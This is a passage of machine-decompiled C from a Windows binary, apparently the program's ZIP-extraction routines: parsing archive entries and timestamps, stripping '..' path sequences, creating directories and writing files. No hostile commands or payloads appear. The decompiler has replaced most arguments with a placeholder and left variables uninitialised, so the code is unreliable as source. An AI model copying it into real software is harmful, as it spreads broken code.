                int32_t v6 = SetFilePointer((int32_t *)hFile, 0, NULL, 1); // 0x406bee
                v4 = &v5;
                if (v6 == -1) {
                    // 0x406c3b
                    return 0x2000000;
                }
            }
            int32_t * v7 = (int32_t *)(v4 - 4); // 0x406c03
            int32_t v8; // bp-8, 0x406b8e
            *v7 = (int32_t)&v8;
            *(int32_t *)(v4 - 8) = a3;
            *(int32_t *)(v4 - 12) = a2;
            *(int32_t *)(v4 - 16) = hFile;
            int32_t v9 = function_405bae((int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x406c0d
            int32_t result; // 0x406b8e
            if (v9 != 0) {
                // 0x406c1e
                *v7 = v9;
                int32_t v10 = function_405fe2((int32_t)&g54); // 0x406c1f
                *(int32_t *)v1 = v10;
                result = v10 == 0 ? 512 : 0;
            } else {
                // 0x406c19
                result = v8;
            }
            // 0x406c3b
            return result;
        }
    }
}

// Address range: 0x406c40 - 0x407070
int32_t function_406c40(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406c40
    if (a1 < -1) {
        // 0x407069
        return 0x10000;
    }
    // 0x406c5f
    int32_t v1; // 0x406c40
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x406c61
    uint32_t v3 = *v2; // 0x406c61
    if (v3 <= a1) {
        // 0x407069
        return 0x10000;
    }
    int32_t v4; // 0x406c40
    int32_t v5; // bp-660, 0x406c40
    if (v3 != -1) {
        // 0x406c6f
        function_406a97(v1);
        v4 = v5;
    }
    int32_t * v6 = (int32_t *)(v1 + 308); // 0x406c76
    *v2 = -1;
    int32_t * v7; // 0x406c40
    int32_t v8; // 0x406c40
    int32_t v9; // 0x406c40
    int32_t v10; // 0x406c40
    int32_t v11; // 0x406c40
    if (*v6 != a1) {
        if (a1 != -1) {
            int32_t * v12 = (int32_t *)(v4 + 16);
            int32_t v13 = *v12; // 0x406cee
            v8 = v13;
            v7 = v12;
            v9 = v4;
            int32_t v14; // bp-656, 0x406c40
            v11 = &v14;
            if (v13 > a1) {
                // 0x406cf3
                v5 = v4;
                function_4064e2(v4);
                v10 = &v5;
                goto lab_0x406cf9;
            } else {
                goto lab_0x406cfa;
            }
        } else {
            goto lab_0x406ca2;
        }
    } else {
        if (a1 != -1) {
            // 0x406c85
            v5 = 300;
            memcpy((int32_t *)a2, (int32_t *)(v1 + 8), 300);
            // 0x407069
            return 0;
        }
        goto lab_0x406ca2;
    }
  lab_0x406dd9:;
    // 0x406dd9
    int32_t * v15; // 0x406c40
    *v15 = (int32_t)"\\..\\";
    int32_t v16; // 0x406c40
    int32_t * v17; // 0x406d12
    *v17 = v16;
    char * v18 = _mbsstr((char *)&g54, (char *)&g54); // 0x406ddf
    char * v19 = v18; // 0x406de5
    if (v18 == NULL) {
        // 0x406de7
        *v15 = (int32_t)"\\../";
        *v17 = v16;
        char * v20 = _mbsstr((char *)&g54, (char *)&g54); // 0x406ded
        v19 = v20;
        if (v20 == NULL) {
            // 0x406df5
            *v15 = (int32_t)"/../";
            *v17 = v16;
            char * v21 = _mbsstr((char *)&g54, (char *)&g54); // 0x406dfb
            v19 = v21;
            if (v21 == NULL) {
                // 0x406e03
                *v15 = (int32_t)"/..\\";
                *v17 = v16;
                char * v22 = _mbsstr((char *)&g54, (char *)&g54); // 0x406e09
                v19 = v22;
                if (v22 == NULL) {
                    // break -> 0x406e16
                    goto lab_0x406e16;
                }
            }
        }
    }
    int32_t v23 = (int32_t)v19 + 4; // 0x406c40
    goto lab_0x406dbe_2;
  lab_0x406ca2:
    // 0x406ca2
    *(int32_t *)a2 = *(int32_t *)(v4 + 4);
    *(char *)(a2 + 4) = 0;
    *(int32_t *)(a2 + 264) = 0;
    *(int32_t *)(a2 + 268) = 0;
    *(int32_t *)(a2 + 272) = 0;
    *(int32_t *)(a2 + 276) = 0;
    *(int32_t *)(a2 + 280) = 0;
    *(int32_t *)(a2 + 284) = 0;
    *(int32_t *)(a2 + 288) = 0;
    *(int32_t *)(a2 + 292) = 0;
    *(int32_t *)(a2 + 296) = 0;
    // 0x407069
    return 0;
  lab_0x406cfa:;
    int32_t v27 = v11;
    int32_t v28 = v9;
    int32_t v29 = v27 - 4;
    v15 = (int32_t *)v29;
    int32_t * v30; // 0x406c40
    int32_t v31; // 0x406c40
    int32_t v32; // 0x406c40
    int32_t v33; // 0x406c40
    char v34; // 0x406c40
    char * str; // bp-12, 0x406c40
    int32_t v35; // bp-16, 0x406c40
    char v36; // 0x406c40
    int32_t * v37; // 0x406d13
    int32_t * v38; // 0x406d14
    int32_t * v39; // 0x406d15
    uint32_t v40; // 0x406e20
    if (v8 < a1) {
        // 0x406d01
        *v15 = v28;
        function_406520((int32_t)&g54);
        v10 = v29;
        goto lab_0x406cf9;
    } else {
        // 0x406d09
        *v15 = 0;
        v17 = (int32_t *)(v27 - 8);
        *v17 = 0;
        v37 = (int32_t *)(v27 - 12);
        *v37 = 0;
        v38 = (int32_t *)(v27 - 16);
        *v38 = 0;
        v39 = (int32_t *)(v27 - 20);
        *v39 = 260;
        int32_t v41; // bp-384, 0x406c40
        int32_t v42 = &v41; // 0x406d1a
        *(int32_t *)(v27 - 24) = v42;
        int32_t v43; // bp-124, 0x406c40
        *(int32_t *)(v27 - 28) = (int32_t)&v43;
        *(int32_t *)(v27 - 32) = v28;
        function_4064bb((int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54);
        *(int32_t *)(v27 - 36) = (int32_t)&v35;
        int32_t v44; // bp-20, 0x406c40
        *(int32_t *)(v27 - 40) = (int32_t)&v44;
        int32_t v45; // bp-44, 0x406c40
        *(int32_t *)(v27 - 44) = (int32_t)&v45;
        *(int32_t *)(v27 - 48) = v28;
        if (function_40657a((int32_t)&g54, &g54, &g54, &g54) != 0) {
            // 0x407069
            return 1792;
        }
        // 0x406d4a
        *v15 = 0;
        *v17 = v44;
        *v37 = v28;
        int32_t v46 = function_405d0e((int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x406d52
        if (v46 != 0) {
            // 0x407069
            return 2048;
        }
        // 0x406d5e
        *v15 = v35;
        int32_t v47 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g54); // 0x406d61
        str = (char *)v47;
        *v17 = v28;
        *v37 = v35;
        *v38 = 1;
        *v39 = v47;
        char * v48 = str; // 0x406d73
        int32_t v49 = function_405d8a((int32_t *)v48, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x406d73
        if (v49 != v35) {
            // 0x406d80
            *v15 = (int32_t)v48;
            _3f__3f_3_40_YAXPAX_40_Z(&g54);
            // 0x407069
            return 2048;
        }
        // 0x406d93
        *(int32_t *)a2 = *v7;
        *v15 = v42;
        int32_t v50; // bp-644, 0x406c40
        int32_t v51 = &v50; // 0x406daa
        *v17 = v51;
        strcpy((char *)&g54, (char *)&g54);
        v23 = v51;
        while (true) {
          lab_0x406dbe_2:
            // 0x406dbe
            v16 = v23;
            char v24 = *(char *)v16; // 0x406dbe
            if (v24 == 0) {
                goto lab_0x406dd9;
            } else {
                int32_t v25 = v16 + 1;
                if (*(char *)v25 != 58) {
                    int32_t v26 = v25; // 0x406dd0
                    if (v24 != 92 == (v24 != 47)) {
                        goto lab_0x406dd9;
                    } else {
                        // 0x406dbe
                        v23 = v26;
                        goto lab_0x406dbe_2;
                    }
                } else {
                    // 0x406dbe
                    v23 = v16 + 2;
                    goto lab_0x406dbe_2;
                }
            }
        }
      lab_0x406e16:
        // 0x406e16
        *v15 = v16;
        *v17 = a2 + 4;
        strcpy((char *)&g54, (char *)&g54);
        struct _FILETIME * v52; // 0x406c40
        v40 = (int32_t)v52;
        uint32_t v53; // 0x406e24
        switch (v53 / 256) {
            case 11: {
                goto lab_0x406e7e;
            }
            case 7: {
                goto lab_0x406e7e;
            }
            case 0: {
                goto lab_0x406e7e;
            }
            default: {
                if ((v43 & -256) != 3584) {
                    // 0x406e7e
                    v33 = v40 / 0x4000000 & 16;
                    v30 = (int32_t *)(a2 + 264);
                    v32 = v40;
                    v31 = v40 / 0x800000 & 257 ^ 1;
                    v34 = 0;
                    v36 = 0;
                    goto lab_0x406e98;
                } else {
                    goto lab_0x406e7e;
                }
            }
        }
    }
  lab_0x406cf9:;
    int32_t v54 = *(int32_t *)v10; // 0x406cf9
    int32_t * v55 = (int32_t *)(v54 + 16); // 0x406cfc
    v8 = *v55;
    v7 = v55;
    v9 = v54;
    v11 = v10 + 4;
    goto lab_0x406cfa;
  lab_0x406e7e:;
    int32_t v56 = v40 & 1; // 0x406e6b
    char v57 = (char)(v40 / 4) & 1; // 0x406e6d
    int32_t v58 = v40 / 32 & 0x7ffff01; // 0x406e7a
    char v59 = (char)(v40 / 2) & 1;
    int32_t v60 = v40 & 16;
    int32_t * v61 = (int32_t *)(a2 + 264); // 0x406e82
    v33 = v60;
    v30 = v61;
    v32 = v58;
    v31 = v56;
    v34 = v59;
    v36 = v57;
    int32_t * v62 = v61; // 0x406e96
    int32_t lpFileTime = v58; // 0x406e96
    int32_t v63 = v56; // 0x406e96
    char v64 = v59; // 0x406e96
    char v65 = v57; // 0x406e96
    int32_t v66 = v60; // 0x406e96
    if ((v40 & 32) == 0) {
        goto lab_0x406e9f;
    } else {
        goto lab_0x406e98;
    }
  lab_0x406e9f:;
    int32_t v67 = v66;
    int32_t v68 = v64 == 0 ? v67 : v67 | 2;
    int32_t v69 = v68 | (int32_t)((char)v63 != 0);
    *v62 = v65 == 0 ? v69 : v69 | 4;
    *v17 = v1 / 0x10000;
    int32_t v70 = function_406b23((int32_t)v65, (int32_t)&g54); // 0x406ee0
    struct _FILETIME * lpLocalFileTime = (struct _FILETIME *)v70; // bp-40, 0x406ee6
    int32_t v71; // bp-32, 0x406c40
    *v15 = (int32_t)&v71;
    *v17 = (int32_t)&lpLocalFileTime;
    LocalFileTimeToFileTime(lpLocalFileTime, (struct _FILETIME *)lpFileTime);
    char * v72 = str; // 0x406f05
    int32_t v73 = (int32_t)v72; // 0x406f05
    int32_t * v74 = (int32_t *)(a2 + 268); // 0x406f08
    *v74 = v71;
    int32_t * v75 = (int32_t *)(a2 + 276); // 0x406f0e
    *v75 = v71;
    int32_t * v76 = (int32_t *)(a2 + 284); // 0x406f14
    *v76 = v71;
    if (v35 >= 5) {
        int32_t v77 = (int32_t)&str; // 0x406f53
        int32_t v78 = 0;
        int32_t v79 = v78 + v73;
        *v37 = (int32_t)"UT";
        str = (char *)(int32_t)*(char *)v79;
        *v38 = v77;
        while (strcmp(str, (char *)(int32_t)*(char *)(v79 + 1)) != 0) {
            int32_t v80 = v78 + 4 + (int32_t)*(char *)(v79 + 2); // 0x406f62
            if (v80 + 4 >= v35) {
                goto lab_0x407037;
            }
            v78 = v80;
            v79 = v78 + v73;
            *v37 = (int32_t)"UT";
            str = (char *)(int32_t)*(char *)v79;
            *v38 = v77;
        }
        unsigned char v81 = *(char *)(v79 + 4); // 0x406f73
        unsigned char v82 = v81 / 4 & 1; // 0x406f83
        int32_t v83 = v78 + 5; // 0x406f86
        int32_t v84 = v83; // 0x406f92
        if ((v81 & 1) != 0) {
            int32_t v85 = (int32_t)*(char *)(v79 + 6); // 0x406f94
            int32_t v86 = v83 + v73; // 0x406f99
            unsigned char v87 = *(char *)(v86 + 3); // 0x406fa1
            unsigned char v88 = *(char *)(v86 + 2); // 0x406fa4
            unsigned char v89 = *(char *)v86; // 0x406fa7
            *v37 = 256 * (256 * (256 * (int32_t)v87 | (int32_t)v88) | v85) | (int32_t)v89;
            *v76 = function_406b02((int32_t)v82);
            *(int32_t *)(a2 + 288) = v85;
            v84 = v78 + 9;
        }
        int32_t v90 = v84; // 0x406fcc
        if ((v81 & 2) != 0) {
            int32_t v91 = (int32_t)*(char *)(v73 + 1 + v84); // 0x406fce
            int32_t v92 = v84 + v73; // 0x406fd3
            unsigned char v93 = *(char *)(v92 + 3); // 0x406fdb
            unsigned char v94 = *(char *)(v92 + 2); // 0x406fde
            unsigned char v95 = *(char *)v92; // 0x406fe1
            *v37 = 256 * (256 * (256 * (int32_t)v93 | (int32_t)v94) | v91) | (int32_t)v95;
            *v74 = function_406b02((int32_t)&g54);
            *(int32_t *)(a2 + 272) = v91;
            v90 = v84 + 4;
        }
        if (v82 != 0) {
            int32_t v96 = (int32_t)*(char *)(v73 + 1 + v90); // 0x407007
            int32_t v97 = v90 + v73; // 0x40700c
            unsigned char v98 = *(char *)(v97 + 3); // 0x407011
            unsigned char v99 = *(char *)(v97 + 2); // 0x407014
            unsigned char v100 = *(char *)v97; // 0x407017
            *v37 = 256 * (256 * (256 * (int32_t)v98 | (int32_t)v99) | v96) | (int32_t)v100;
            *v75 = function_406b02((int32_t)&g54);
            *(int32_t *)(a2 + 280) = v96;
        }
    }
  lab_0x407037:
    if (v72 != NULL) {
        // 0x40703b
        *v37 = v73;
        _3f__3f_3_40_YAXPAX_40_Z(&g54);
    }
    // 0x407042
    *v37 = 300;
    *v38 = a2;
    *v39 = v1 + 8;
    memcpy(&g54, &g54, (int32_t)&g54);
    *v6 = a1;
    // 0x407069
    return 0;
  lab_0x406e98:
    // 0x406e98
    v62 = v30;
    lpFileTime = v32;
    v63 = v31;
    v64 = v34;
    v65 = v36;
    v66 = v33 | 32;
    goto lab_0x406e9f;
}

// Address range: 0x407070 - 0x407136
int32_t function_407070(int32_t a1, int32_t a2) {
    // 0x407070
    int32_t v1; // bp-532, 0x407070
    int32_t * v2 = &v1; // 0x407080
    int32_t v3; // 0x407070
    if (a1 != 0) {
        int32_t v4 = a1; // bp-536, 0x407082
        char * lpFileName = (char *)a1; // 0x407083
        int32_t v5 = GetFileAttributesA(lpFileName); // 0x407083
        v3 = v5;
        v2 = &v4;
        if (v5 == -1) {
            int32_t v6 = a1; // bp-544, 0x407090
            v3 = CreateDirectoryA(lpFileName, NULL);
            v2 = &v6;
        }
    }
    unsigned char v7 = *(char *)a2; // 0x40709a
    int32_t result = v3 & -256 | (int32_t)v7; // 0x40709a
    if (v7 == 0) {
        // 0x407132
        return result;
    }
    int32_t v8 = (int32_t)v2;
    int32_t * v9 = (int32_t *)(v8 - 4); // 0x4070a4
    int32_t v10 = a2; // 0x4070a7
    int32_t v11 = a2; // 0x4070a7
    char v12 = result; // 0x4070a9
    v11 = v12 != 47 == (v12 != 92) ? v11 : v10;
    v10++;
    unsigned char v13 = *(char *)v10; // 0x4070b3
    while (v13 != 0) {
        // 0x4070a9
        v12 = v13;
        v11 = v12 != 47 == (v12 != 92) ? v11 : v10;
        v10++;
        v13 = *(char *)v10;
    }
    if (v11 != a2) {
        int32_t v14 = v11 - a2; // 0x4070bf
        *(int32_t *)(v8 - 8) = v14;
        *(int32_t *)(v8 - 12) = a2;
        int32_t v15; // bp-524, 0x407070
        int32_t v16 = &v15; // 0x4070c9
        *(int32_t *)(v8 - 16) = v16;
        memcpy(&g54, &g54, (int32_t)&g54);
        int32_t v17; // bp-4, 0x407070
        *(char *)((int32_t)&v17 - 520 + v14) = 0;
        *(int32_t *)(v8 - 20) = v16;
        *(int32_t *)(v8 - 24) = a1;
        function_407070((int32_t)&g54, (int32_t)&g54);
    }
    char v18 = 0; // bp-264, 0x4070e7
    int32_t * v19; // 0x407070
    int32_t v20; // 0x407070
    if (a1 == 0) {
        // 0x4070e7
        v20 = &v18;
        v19 = (int32_t *)(v8 - 8);
    } else {
        // 0x4070f3
        *v9 = a1;
        int32_t * v21 = (int32_t *)(v8 - 8);
        int32_t v22 = &v18;
        *v21 = v22;
        strcpy(NULL, (char *)&g54);
        v20 = v22;
        v19 = v21;
    }
    // 0x407102
    *v9 = a2;
    *v19 = v20;
    strcat((char *)&g54, (char *)&g54);
    *v9 = v20;
    int32_t v23 = GetFileAttributesA((char *)&g54); // 0x407118
    int32_t result2 = v23; // 0x407121
    if (v23 == -1) {
        // 0x407123
        *v19 = 0;
        *(int32_t *)(v8 - 12) = v20;
        result2 = CreateDirectoryA((char *)&g54, (struct _SECURITY_ATTRIBUTES *)&g54);
    }
    // 0x407132
    return result2;
}

// Address range: 0x407136 - 0x40747b
int32_t function_407136(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = a4;
    int32_t v2 = a2;
    int32_t v3; // bp-840, 0x407136
    int32_t v4 = &v3; // 0x407147
    int32_t * v5; // 0x407136
    int32_t * v6; // 0x407136
    int32_t v7; // 0x407136
    int32_t v8; // 0x407136
    int32_t v9; // 0x407136
    int32_t v10; // 0x407136
    int32_t v11; // 0x407136
    int32_t v12; // 0x407136
    int32_t v13; // 0x407136
    int32_t v14; // 0x407136
    int32_t v15; // 0x407136
    int32_t v16; // bp-844, 0x407136
    int32_t v17; // 0x407136
    int32_t * v18; // 0x407136
    if (a6 == 3) {
        // 0x407168
        v18 = (int32_t *)(v17 + 4);
        int32_t v19 = *v18; // 0x407168
        if (v19 == a1) {
            // 0x407168
            v6 = (int32_t *)(v4 - 8);
            v5 = (int32_t *)(v4 - 4);
            v13 = v4;
            goto lab_0x4071b7;
        } else {
            int32_t * v20 = v18; // 0x407175
            int32_t v21; // 0x407136
            if (v19 != -1) {
                // 0x407177
                function_406a97(v17);
                v20 = (int32_t *)(v16 + 4);
                v21 = v16;
            }
            // 0x40717f
            *v18 = -1;
            if (*v20 <= a1) {
                // 0x407474
                return 0x10000;
            }
            int32_t v22 = *(int32_t *)(v21 + 16); // 0x40718a
            v7 = v22;
            v9 = v21;
            v12 = v4;
            if (v22 > a1) {
                // 0x40718f
                v16 = v21;
                function_4064e2(v21);
                v11 = &v16;
                goto lab_0x407195;
            } else {
                goto lab_0x407196;
            }
        }
    } else {
        // 0x40714c
        if (a6 >= 3) {
            // 0x407474
            return 0x10000;
        }
        int32_t * v23 = (int32_t *)(v17 + 4);
        int32_t * v24 = v23; // 0x407214
        int32_t v25; // 0x407136
        if (*v23 != -1) {
            // 0x407216
            function_406a97(v17);
            v24 = (int32_t *)(v16 + 4);
            v25 = v16;
        }
        // 0x40721e
        *v23 = -1;
        if (*v24 <= a1) {
            // 0x407474
            return 0x10000;
        }
        int32_t v26 = *(int32_t *)(v25 + 16); // 0x407230
        v8 = v26;
        v10 = v25;
        v15 = v4;
        if (v26 > a1) {
            // 0x407235
            v16 = v25;
            function_4064e2(v25);
            v14 = &v16;
            goto lab_0x40723b;
        } else {
            goto lab_0x40723c;
        }
    }
  lab_0x4072be:;
    // 0x4072be
    int32_t v27; // 0x407136
    int32_t v28 = v27 + 1;
    int32_t v29 = v28; // 0x4072be
    int32_t v30 = v28; // 0x4072be
    goto lab_0x4072c1;
  lab_0x4072c1:;
    int32_t v31 = v29; // 0x4072c5
    int32_t v32 = v30; // 0x4072c5
    goto lab_0x4072b2;
  lab_0x40723c:;
    int32_t v35 = v15;
    int32_t v36 = v35 - 4;
    int32_t * v37 = (int32_t *)v36;
    int32_t v33; // 0x407136
    int32_t v38; // 0x407136
    int32_t v39; // 0x407136
    int32_t * v40; // 0x4072cd
    int32_t * v41; // 0x4072ce
    int32_t v42; // 0x4072ce
    int32_t v43; // 0x4072d7
    char v44; // 0x407136
    if (v8 < a1) {
        // 0x407243
        *v37 = v10;
        function_406520((int32_t)&g54);
        v14 = v36;
        goto lab_0x40723b;
    } else {
        // 0x40724b
        int32_t v45; // bp-568, 0x407136
        *v37 = (int32_t)&v45;
        int32_t v46 = v35 - 8; // 0x407254
        *(int32_t *)v46 = a1;
        function_406c40((int32_t)&g54, (int32_t)&g54, (int32_t)&g54);
        if ((v44 & 16) == 0) {
            // 0x40729c
            v31 = a3;
            v32 = a3;
            v38 = v46;
            v39 = a3;
            if (a6 != 1) {
                while (true) {
                  lab_0x4072b2:
                    // 0x4072b2
                    v33 = v32;
                    v27 = v31;
                    char v34 = *(char *)v27;
                    switch (v34) {
                        case 0: {
                            goto lab_0x4072c7;
                        }
                        case 47: {
                            goto lab_0x4072be;
                        }
                        default: {
                            if (v34 != 92) {
                                // 0x4072ba
                                v29 = v27 + 1;
                                v30 = v33;
                                goto lab_0x4072c1;
                            } else {
                                goto lab_0x4072be;
                            }
                        }
                    }
                }
              lab_0x4072c7:
                // 0x4072c7
                v40 = (int32_t *)(v35 - 12);
                *v40 = a3;
                v41 = (int32_t *)(v35 - 16);
                char v47; // bp-268, 0x407136
                v42 = &v47;
                *v41 = v42;
                strcpy((char *)&g54, (char *)&g54);
                v43 = *v40;
                if (v33 != a3) {
                    // 0x407343
                    int32_t v48; // bp-4, 0x407136
                    *(char *)(-264 - a3 + (int32_t)&v48 + v33) = 0;
                    switch (v47) {
                        case 92: {
                            goto lab_0x40737b;
                        }
                        case 47: {
                            goto lab_0x40737b;
                        }
                        case 0: {
                            goto lab_0x4072e1;
                        }
                        default: {
                            if (v44 != 58) {
                                goto lab_0x4072e1;
                            } else {
                                goto lab_0x40737b;
                            }
                        }
                    }
                } else {
                    // 0x4072da
                    v47 = 0;
                    goto lab_0x4072e1;
                }
            } else {
                goto lab_0x407331;
            }
        } else {
            // 0x407263
            if (a6 == 1) {
                // 0x407474
                return 0;
            }
            // 0x40726c
            switch (*(char *)a3) {
                case 47: {
                    goto lab_0x407283;
                }
                case 92: {
                    goto lab_0x407283;
                }
                case 0: {
                    goto lab_0x407288;
                }
                default: {
                    // 0x40727d
                    if (*(char *)(a3 + 1) != 58) {
                        goto lab_0x407288;
                    } else {
                        goto lab_0x407283;
                    }
                }
            }
        }
    }
  lab_0x4071b7:
    // 0x4071b7
    *v5 = (int32_t)&v2;
    *v6 = a5;
    *(int32_t *)(v13 - 12) = a3;
    int32_t v49; // 0x407136
    *(int32_t *)(v13 - 16) = v49;
    int32_t v50 = function_406880((int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x4071c3
    if (v50 >= 0 != v50 != 0) {
        // 0x4071d1
        *v5 = v49;
        function_406a97((int32_t)&g54);
        *v18 = -1;
    }
    // 0x4071dd
    if ((char)v2 != 0) {
        // 0x407474
        return 0;
    }
    int32_t result = 1536; // 0x4071ec
    if (v50 < 1) {
        // 0x4071f8
        result = v50 == -106 ? 0x1000 : 0x5000000;
    }
    // 0x407474
    return result;
  lab_0x407196:;
    int32_t v51 = v12;
    int32_t v52 = v9;
    if (v7 < a1) {
        int32_t v53 = v51 - 4; // 0x40719d
        *(int32_t *)v53 = v52;
        function_406520((int32_t)&g54);
        v11 = v53;
        goto lab_0x407195;
    } else {
        int32_t * v54 = (int32_t *)(v51 - 4);
        *v54 = *(int32_t *)(v17 + 312);
        int32_t * v55 = (int32_t *)(v51 - 8);
        *v55 = v52;
        function_40671d((int32_t)&g54, (int32_t)&g54);
        *v18 = a1;
        v6 = v55;
        v5 = v54;
        v49 = *v54;
        v13 = v51;
        goto lab_0x4071b7;
    }
  lab_0x40723b:;
    int32_t v56 = *(int32_t *)v14; // 0x40723b
    v8 = *(int32_t *)(v56 + 16);
    v10 = v56;
    v15 = v14 + 4;
    goto lab_0x40723c;
  lab_0x407195:;
    int32_t v57 = *(int32_t *)v11; // 0x407195
    v7 = *(int32_t *)(v57 + 16);
    v9 = v57;
    v12 = v11 + 4;
    goto lab_0x407196;
  lab_0x407331:;
    int32_t v58 = v39;
    if (v58 == -1) {
        // 0x407474
        return 512;
    }
    int32_t * v59 = (int32_t *)(v38 - 4); // 0x4073ab
    *v59 = *(int32_t *)(v17 + 312);
    int32_t v60; // 0x407136
    *(int32_t *)(v38 - 8) = v60;
    function_40671d(v58, (int32_t)&g54);
    int32_t * v61 = (int32_t *)(v17 + 316); // 0x4073b8
    if (*v61 == 0) {
        // 0x4073c8
        *v59 = 0x4000;
        *v61 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g54);
    }
    int32_t v62 = *v59;
    int32_t v63 = v38;
    int32_t * v64 = (int32_t *)(v63 - 4); // 0x4073dc
    *v64 = (int32_t)&v1;
    int32_t * v65 = (int32_t *)(v63 - 8); // 0x4073dd
    *v65 = 0x4000;
    int32_t * v66 = (int32_t *)(v63 - 12); // 0x4073de
    *v66 = *v61;
    int32_t * v67 = (int32_t *)(v63 - 16); // 0x4073e4
    *v67 = v62;
    int32_t v68 = function_406880((int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x4073e6
    int32_t v69; // 0x407136
    int32_t v70; // 0x407136
    while (v68 != -106) {
        // 0x4073f5
        if (v68 < 0) {
            // break -> 0x40745a
            break;
        }
        int32_t v71 = v63; // 0x4073f9
        if (v68 != 0) {
            // 0x4073fb
            *v64 = 0;
            int32_t v72; // bp-8, 0x407136
            *v65 = (int32_t)&v72;
            *v66 = v68;
            *v67 = *v61;
            int32_t v73 = v63 - 20; // 0x407408
            *(int32_t *)v73 = v58;
            bool v74 = WriteFile(&g54, &g54, (int32_t)&g54, &g54, (struct _OVERLAPPED *)&g54); // 0x40740b
            v71 = v73;
            v70 = 1024;
            v69 = v73;
            if (!v74) {
                // break -> 0x40745a
                break;
            }
        }
        int32_t v75 = v71;
        if ((char)v1 != 0) {
            // 0x40743c
            int32_t v76; // bp-284, 0x407136
            *(int32_t *)(v75 - 4) = (int32_t)&v76;
            int32_t v77; // bp-300, 0x407136
            *(int32_t *)(v75 - 8) = (int32_t)&v77;
            int32_t v78; // bp-292, 0x407136
            *(int32_t *)(v75 - 12) = (int32_t)&v78;
            int32_t v79 = v75 - 16; // 0x407451
            *(int32_t *)v79 = v58;
            SetFileTime(&g54, (struct _FILETIME *)&g54, (struct _FILETIME *)&g54, (struct _FILETIME *)&g54);
            v70 = 0;
            v69 = v79;
            goto lab_0x40745a;
        }
        int32_t v80 = v75; // 0x40741d
        v70 = 0x5000000;
        v69 = v75;
        if (v68 == 0) {
            // break -> 0x40745a
            break;
        }
        v63 = v80;
        v64 = (int32_t *)(v63 - 4);
        *v64 = (int32_t)&v1;
        v65 = (int32_t *)(v63 - 8);
        *v65 = 0x4000;
        v66 = (int32_t *)(v63 - 12);
        *v66 = *v61;
        v67 = (int32_t *)(v63 - 16);
        *v67 = v62;
        v68 = function_406880((int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54);
    }
    goto lab_0x40745a;
  lab_0x407283:
    // 0x407283
    *(int32_t *)(v35 - 12) = a3;
    *(int32_t *)(v35 - 16) = 0;
    // 0x407290
    function_407070((int32_t)&g54, (int32_t)&g54);
    // 0x407474
    return 0;
  lab_0x407288:
    // 0x407288
    *(int32_t *)(v35 - 12) = a3;
    *(int32_t *)(v35 - 16) = v17 + 320;
    // 0x407290
    function_407070((int32_t)&g54, (int32_t)&g54);
    // 0x407474
    return 0;
  lab_0x40745a:;
    int32_t v81 = v69;
    int32_t hObject = v70;
    int32_t v82 = v81; // 0x40745e
    if (a6 != 1) {
        int32_t v83 = v81 - 4; // 0x407460
        *(int32_t *)v83 = v58;
        CloseHandle((int32_t *)hObject);
        v82 = v83;
    }
    // 0x407469
    *(int32_t *)(v82 - 4) = v62;
    function_406a97((int32_t)&g54);
    // 0x407474
    return hObject;
  lab_0x40737b:
    // 0x40737b
    *v40 = v33;
    *v41 = v42;
    int32_t * v84 = (int32_t *)(v35 - 20);
    *v84 = (int32_t)"%s%s";
    int32_t * v85 = (int32_t *)(v35 - 24);
    int32_t v86; // bp-828, 0x407136
    int32_t v87 = &v86;
    *v85 = v87;
    wsprintfA((char *)&g54, (char *)&g54);
    int32_t * v88 = (int32_t *)(v35 - 28);
    *v88 = v42;
    int32_t * v89 = (int32_t *)(v35 - 32);
    *v89 = 0;
    function_407070((int32_t)&g54, (int32_t)&g54);
    int32_t v90 = v35 - 36; // 0x40732a
    int32_t v91 = v87; // 0x4073a6
    int32_t * v92 = (int32_t *)v90; // 0x4073a6
    int32_t v93 = v90; // 0x4073a6
    int32_t * v94 = v89; // 0x4073a6
    int32_t * v95 = v88; // 0x4073a6
    int32_t * v96 = v85; // 0x4073a6
    int32_t * v97 = v84; // 0x4073a6
    goto lab_0x407312;
  lab_0x4072e1:;
    int32_t v98 = v17 + 320; // 0x4072e7
    *v40 = v33;
    *v41 = v42;
    int32_t * v99 = (int32_t *)(v35 - 20);
    *v99 = v98;
    int32_t * v100 = (int32_t *)(v35 - 24);
    *v100 = (int32_t)"%s%s%s";
    int32_t * v101 = (int32_t *)(v35 - 28);
    int32_t v102 = &v86;
    *v101 = v102;
    wsprintfA((char *)&g54, (char *)&g54);
    int32_t * v103 = (int32_t *)(v35 - 32);
    *v103 = v42;
    int32_t v104 = v35 - 36;
    int32_t * v105 = (int32_t *)v104;
    *v105 = v98;
    function_407070((int32_t)&g54, (int32_t)&g54);
    v91 = v102;
    v92 = v105;
    v93 = v104;
    v94 = v103;
    v95 = v101;
    v96 = v100;
    v97 = v99;
    goto lab_0x407312;
  lab_0x407312:
    // 0x407312
    *v40 = 0;
    *v41 = (int32_t)v44;
    *v97 = 2;
    *v96 = 0;
    *v95 = 0;
    *v94 = 0x40000000;
    *v92 = v91;
    int32_t * fileHandle = CreateFileA((char *)&g54, (int32_t)&g54, (int32_t)&g54, (struct _SECURITY_ATTRIBUTES *)&g54, (int32_t)&g54, (int32_t)&g54, &g54); // 0x40732b
    v60 = v43;
    v38 = v93;
    v39 = (int32_t)fileHandle;
    goto lab_0x407331;
}

// Address range: 0x40747b - 0x4074a4
int32_t function_40747b(void) {
    // 0x40747b
    int32_t v1; // 0x40747b
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x40747e
    if (*v2 != -1) {
        // 0x407484
        function_406a97(v1);
    }
    // 0x40748c
    *v2 = -1;
    if (v1 != 0) {
        // 0x407496
        function_406162(v1);
    }
    // 0x40749d
    *(int32_t *)v1 = 0;
    return 0;
}

// Address range: 0x4074a4 - 0x407527
